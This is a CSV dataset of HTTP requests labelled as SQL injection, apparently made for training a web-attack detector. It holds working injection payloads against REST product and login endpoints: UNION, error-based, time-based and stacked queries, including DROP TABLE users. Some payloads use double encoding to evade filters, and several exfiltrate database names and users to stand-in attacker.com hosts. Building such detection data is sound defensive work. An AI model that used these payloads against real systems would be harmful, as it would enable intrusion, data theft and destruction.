RequestMethod,RequestURIPath,RequestURIQuery,RequestProtocol,UserAgent,Referer,AcceptEncoding,ContentType,Accept,Cookie,Connection,OtherHeaders,RequestBody,ResponseStatus,AIVerdictLabel,AIVulnerabilityTypeLabel,RequestLength,PathLength,QueryLength,BodyLength,NumParams,LongestParamValueLength,NumSpecialChars,NumEncodedChars,NumDoubleEncodedChars,RatioSpecialCharsToTotalChars,NumKeywords,NumUniqueChars,IsJSONBody,IsXMLBody,IsMultipartForm,HasNumericPathSegment,DepthOfPath,UsesBase64Encoding,UsesHexEncoding,HasMultipleContentLength,InvalidHTTPVersion,NumHTTPHeaders,TimeOfDayHour,TimeOfDayDayOfWeek,Unnamed: 59,Unnamed: 60,Unnamed: 61,Unnamed: 62,Unnamed: 63,Unnamed: 64,Unnamed: 65,Unnamed: 66,Unnamed: 67,Unnamed: 68,Unnamed: 69,Unnamed: 70,Unnamed: 71,Unnamed: 72
GET,/rest/products/search,query=%27+OR+%27k%27%3D%27k%27+,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,228,21,31,0,1,13,12,6,0,0.2308,0,24,FALSE,FALSE,FALSE,FALSE,3,TRUE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,id=%27+AND+%28SELECT+UPDATEXML%281%2CCONCAT%280x7e%2C%28user%28%29%29%2C0x7e%29%29%29--,HTTP/1.1,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,291,21,87,0,1,56,20,14,0,0.1852,2,37,FALSE,FALSE,FALSE,FALSE,3,TRUE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,term=%27+AND+%28SELECT+LOAD_FILE%28CONCAT%28%27%5C%5C%27%2C%28SELECT+user%28%29%29%2C%27.exfil-512.attacker.com%5Cabc%27%29%29%29--,HTTP/1.1,"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,368,21,131,0,1,86,31,20,0,0.2039,5,42,FALSE,FALSE,FALSE,FALSE,3,TRUE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,category=%27+AND+%28SELECT+LOAD_FILE%28CONCAT%28%27%5C%5C%27%2C%28SELECT+database%28%29%29%2C%27.exfil-927.attacker.com%5Cabc%27%29%29%29%23,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,338,21,140,0,1,89,32,21,0,0.1988,5,44,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
POST,/rest/user/login,,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:83,"{""email"": ""admin' UNION SELECT NULL, user()/*@example.com"", ""password"": ""password""}",,malicious,sqli,336,16,0,83,2,46,24,0,0,0.2424,4,39,TRUE,FALSE,FALSE,FALSE,3,FALSE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
POST,/rest/user/login,,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:83,"{""email"": ""admin@example.com"", ""password"": ""password' UNION SELECT NULL, user()/*""}",,malicious,sqli,336,16,0,83,2,37,24,0,0,0.2424,4,39,TRUE,FALSE,FALSE,FALSE,3,FALSE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/1,id=%2527%253b%2520%2555%2550%2544%2541%2554%2545%2520%2570%2572%256f%2564%2575%2563%2574%2573%2520%2553%2545%2554%2520%2573%2574%2561%2574%2575%2573%253d%2527%2568%2561%2563%256b%2565%2564%255f%2570%2577%2527%2520%2557%2548%2545%2552%2545%2520%2569%2564%253d%2531%253b%252f%252a,HTTP/1.1,"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,510,16,278,0,1,165,58,55,55,0.1973,0,26,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/5,id=%2527%2BOR%2BTRUE%2B,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,216,16,23,0,1,12,7,4,1,0.1795,0,22,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/2,id=%2527%2520%2541%254e%2544%2520%2528%2553%2545%254C%2545%2543%2554%2520%2545%2558%2554%2552%2541%2543%2554%2556%2541%254C%2555%2545%2528%2531%252C%2543%254F%254e%2543%2541%2554%2528%2530%2578%2537%2565%252c%2528%2563%2575%2572%2572%2565%256e%2574%255f%2575%2573%2565%2572%2528%2529%2529%252c%2530%2578%2537%2565%2529%2529%2529%252f%252a,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,539,16,338,0,1,201,70,67,67,0.1977,0,27,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/5,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:90,"{""name"": ""ATtACked PRodUcT"", ""description"": ""New deSC ' UNIoN SEleCT NulL, NuLl, UsEr()#""}",,malicious,sqli,373,16,0,90,2,43,22,0,0,0.2075,5,39,TRUE,FALSE,FALSE,TRUE,3,FALSE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/10,id=%2527%2520%2555%254e%2549%254f%254e%2520%2553%2545%254c%2545%2543%2554%2520%254e%2555%254c%254c%252c%2520%254e%2555%254c%254c%252c%2520%2575%2573%2565%2572%2528%2529%252c%2520%254e%2555%254c%254c%252c%2520%254e%2555%254c%254c%252c%2520%254e%2555%254c%254c%252c%2520%254e%2555%254c%254c%252c%2520%254e%2555%254c%254c%2523,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,517,17,323,0,1,192,67,64,64,0.1971,0,24,FALSE,FALSE,FALSE,TRUE,3,TRUE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/7,id=%27+oR+TrUe+,HTTP/1.1,"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,247,16,15,0,1,10,7,1,0,0.2258,0,19,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/10,,HTTP/1.1,"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:337,"{""name"": ""&#x41;&#x74;&#x74;&#x61;&#x63;&#x6b;&#x65;&#x64;&#x20;&#x50;&#x72;&#x6f;&#x64;&#x75;&#x63;&#x74;"", ""description"": ""&#x4e;&#x65;&#x77;&#x20;&#x64;&#x65;&#x73;&#x63;&#x20;&#x27;&#x20;&#x41;&#x4e;&#x44;&#x20;&#x33;&#x34;&#x3d;&#x34;&#x38;&#x20;&#x41;&#x4e;&#x44;&#x20;&#x53;&#x4c;&#x45;&#x45;&#x50;&#x28;&#x33;&#x29;&#x2f;&#x2a;""}",,malicious,sqli,622,17,0,337,2,210,169,0,0,0.4774,1,36,TRUE,FALSE,FALSE,TRUE,3,FALSE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/1,,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:121,"{""name"": ""AtTacked produCT"", ""description"": ""New+desc+%27+UNION+SELECT+NULL%2C+NULL%2C+NULL%2C+NULL%2C+user%28%29%2F%2A""}",,malicious,sqli,366,16,0,121,2,74,34,9,0,0.2482,3,40,TRUE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,category=%2522%2520%254f%2552%2520%2536%2538%253d%2537%2535%252f%252a,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,306,21,69,0,1,36,15,12,12,0.1667,0,25,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,term=%27+AND+%28SELECT+UPDATEXML%281%2CCONCAT%280x7e%2C%28user%28%29%29%2C0x7e%29%29%29%2F%2A,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,291,21,93,0,1,56,22,16,0,0.193,2,37,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,data=%27+AND+%28SELECT+EXTRACTVALUE%281%2CCONCAT%280x7e%2C%28version%28%29%29%2C0x7e%29%29%29+,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,291,21,94,0,1,61,21,14,0,0.1826,2,38,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/5,id=%27%3B+INSERT+INTO+users+%28name%29+VALUES+%28%27fuzz_test_993%27%29%3B%23,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,340,16,77,0,1,54,21,10,0,0.2258,1,38,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,term=%27+AND+UTL_HTTP.REQUEST%28%27http%3A%2F%2Fexfil-428.attacker.com%2F%27%7C%7C%40%40hostname%29%23,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,299,21,102,0,1,69,23,14,0,0.187,0,46,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,file=%27%3B+DRoP+taBLE+UsErS%3B%23,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,231,21,34,0,1,21,10,4,0,0.1818,1,29,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/9,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:112,"{""name"": ""Attacked Product"", ""description"": ""New desc ' AND (SELECT UPDATEXML(1,CONCAT(0x7e,(user()),0x7e)))/*""}",,malicious,sqli,380,16,0,112,2,65,32,0,0,0.25,5,44,TRUE,FALSE,FALSE,TRUE,3,TRUE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/1,,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:523,"{""name"": ""&#x25;&#x34;&#x31;&#x25;&#x37;&#x34;&#x25;&#x37;&#x34;&#x25;&#x36;&#x31;&#x25;&#x36;&#x33;&#x25;&#x36;&#x62;&#x25;&#x36;&#x35;&#x25;&#x36;&#x34;&#x25;&#x32;&#x30;&#x25;&#x35;&#x30;&#x25;&#x37;&#x32;&#x25;&#x36;&#x66;&#x25;&#x36;&#x34;&#x25;&#x37;&#x35;&#x25;&#x36;&#x33;&#x25;&#x37;&#x34;"", ""description"": ""&#x4e;&#x65;&#x57;&#x20;&#x64;&#x65;&#x53;&#x43;&#x20;&#x27;&#x20;&#x41;&#x6e;&#x64;&#x20;&#x54;&#x52;&#x75;&#x45;&#x20;&#x41;&#x4e;&#x44;&#x20;&#x53;&#x6c;&#x65;&#x65;&#x70;&#x28;&#x34;&#x29;&#x2f;&#x2a;""}",,malicious,sqli,776,16,0,523,2,288,262,0,0,0.4861,1,35,TRUE,FALSE,FALSE,TRUE,3,FALSE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/4,id=%27+UNION+SELECT+NULL%2C+NULL%2C+NULL%2C+NULL%2C+NULL%2C+NULL%2C+NULL%2C+version%28%29+,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,282,16,90,0,1,67,24,10,0,0.2264,2,30,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/6,id=%27+AND+%28SELECT+UPDATEXML%281%2CCONCAT%280x7e%2C%28user%28%29%29%2C0x7e%29%29%29--,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,280,16,87,0,1,56,20,14,0,0.1942,2,36,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/6,,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:70,"{""name"": ""Attacked Product"", ""description"": ""New desc \"" OR 'v'='v'#""}",,malicious,sqli,384,16,0,70,2,22,23,0,0,0.2674,1,33,TRUE,FALSE,FALSE,TRUE,3,FALSE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/5,,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:389,"{""name"": ""&#x25;&#x34;&#x31;&#x25;&#x37;&#x34;&#x25;&#x37;&#x34;&#x25;&#x36;&#x31;&#x25;&#x36;&#x33;&#x25;&#x36;&#x62;&#x25;&#x36;&#x35;&#x25;&#x36;&#x34;&#x25;&#x32;&#x30;&#x25;&#x35;&#x30;&#x25;&#x37;&#x32;&#x25;&#x36;&#x66;&#x25;&#x36;&#x34;&#x25;&#x37;&#x35;&#x25;&#x36;&#x33;&#x25;&#x37;&#x34;"", ""description"": ""New+DesC+%27+aNd+%27x%27%3D%27X%27+AND+WaITFOr+DELay+%270%3A0%3a7%27--""}",,malicious,sqli,704,16,0,389,2,288,178,10,0,0.4395,1,49,TRUE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,search=%27+anD+trUe+AND+SLeEP%283%29--,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,236,21,38,0,1,25,10,3,0,0.1695,2,30,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
POST,/rest/user/login,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:82,"{""email"": ""admin' UNION SELECT user(), NULL#@example.com"", ""password"": ""password""}",,malicious,sqli,350,16,0,82,2,45,23,0,0,0.2347,4,39,TRUE,FALSE,FALSE,FALSE,3,FALSE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
POST,/rest/user/login,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:82,"{""email"": ""admin@example.com"", ""password"": ""password' UNION SELECT user(), NULL#""}",,malicious,sqli,350,16,0,82,2,36,23,0,0,0.2347,4,39,TRUE,FALSE,FALSE,FALSE,3,FALSE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
